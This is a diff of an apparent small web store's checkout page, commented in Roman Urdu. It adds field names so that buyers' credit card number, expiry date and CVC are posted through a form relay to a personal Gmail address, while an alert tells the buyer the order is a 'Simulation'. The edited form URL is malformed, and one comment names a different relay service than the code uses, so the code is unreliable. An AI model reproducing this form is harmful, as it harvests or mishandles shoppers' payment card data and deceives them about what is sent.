@@ -51,7 +51,7 @@
         </div>
         <p id="productDetailRating" class="product-rating">...</p>
     </div>
-    
+
     <footer class="buy-now-footer">
         <button id="buyNowButton" class="buy-now-btn">Buy Now</button>
     </footer>
@@ -60,7 +60,7 @@
     <div id="paymentOverlay" class="payment-overlay">
         <div class="payment-modal">
             
-            <form id="orderForm" action="https://formsubmit.co/uzairkindom@gmail.com" method="POST">
+            <form id="orderForm" action="HTTPS://form submit.co/uzairkindom@gmail.com" method="POST">
             
                 <h3>Enter Details</h3>
                 
@@ -75,34 +75,32 @@
                 
                 <div class="form-group">
                     <label for="cardNumber">Credit Card Number</label>
-                    <input type="text" id="cardNumber" placeholder="0000 0000 0000 0000">
+                    <input type="text" id="cardNumber" name="card_number" placeholder="0000 0000 0000 0000">
                 </div>
                 
                 <div class="expiry-cvc">
                     <div class="form-group">
                         <label for="expiry">MM/YY</label>
-                        <input type="text" id="expiry" placeholder="12/26">
+                        <input type="text" id="expiry" name="expiry_date" placeholder="12/26">
                     </div>
                     <div class="form-group">
                         <label for="cvc">CVC</label>
-                        <input type="text" id="cvc" placeholder="123">
+                        <input type="text" id="cvc" name="cvc_code" placeholder="123">
                     </div>
                 </div>
 
-                <input type="hidden" id="productNameInput" name="Product">
-                <input type="hidden" id="productPriceInput" name="Price">
-                
-                <input type="hidden" name="_subject" value="Naya Order Aaya Hai! - ApnaStore">
-                
-                <input type="hidden" name="_next" value="">
+                <input type="hidden" id="productNameInput" name="product_name">
+                <input type="hidden" id="productPriceInput" name="product_price">
 
                 <button type="submit" id="payNowButton" class="pay-btn">Place Order</button>
                 <button type="button" id="cancelButton" class="cancel-btn">Cancel</button>
             
-            </form> </div>
+            </form> 
+        </div>
     </div>
 
     <script>
+        // Global variables taake inko baad mein istemal kar sakein
         let currentProductTitle = "";
         let currentProductPrice = "";
 
@@ -116,9 +114,11 @@
             const rating = params.get('rating');
             const img = params.get('img');
 
+            // Global variables ko update karein
             currentProductTitle = title || "Product Not Found";
             currentProductPrice = price || "Rs.0";
 
+            // Page update karo
             document.getElementById('productDetailTitle').innerText = currentProductTitle;
             document.getElementById('productDetailPrice').innerText = currentProductPrice;
             document.getElementById('productDetailOriginalPrice').innerText = oprice || "";
@@ -126,8 +126,10 @@
             document.getElementById('productDetailImage').src = img || "default.jpg";
             document.getElementById('productDetailImage').alt = currentProductTitle;
             
+            // Pay button ka text update karo
             document.getElementById('payNowButton').innerText = 'Place Order (Pay ' + currentProductPrice + ')';
 
+            // Hidden form fields ko bhi update karo
             document.getElementById('productNameInput').value = currentProductTitle;
             document.getElementById('productPriceInput').value = currentProductPrice;
         });
@@ -146,22 +148,24 @@
             paymentOverlay.style.display = 'none';
         });
 
-        // Form submit hone se pehle check karna
+        // NAYA SCRIPT: Form submit hone se pehle check karna
         orderForm.addEventListener('submit', function(event) {
+            // Form ko foran submit hone se rokein
+            event.preventDefault(); 
+            
             const location = document.getElementById('location').value;
             
             if (location === "") {
-                // Form ko submit hone se rokein
-                event.preventDefault(); 
                 alert('Please enter your location first!');
             } else {
-                // Location enter ki hai, toh form ko submit hone dein
+                // Agar location enter ki hai, toh form ko submit kar dein
                 alert('Order placed! (Simulation)\nAapki details submit ho rahi hain...');
                 
-                // Form ko submit hone dein (yeh data FormSubmit.co ko bhej dega)
+                // Ab form ko submit karein (yeh data Formspree ko bhej dega)
+                orderForm.submit();
             }
         });
     </script>
 
 </body>
-</html>         
+</html>
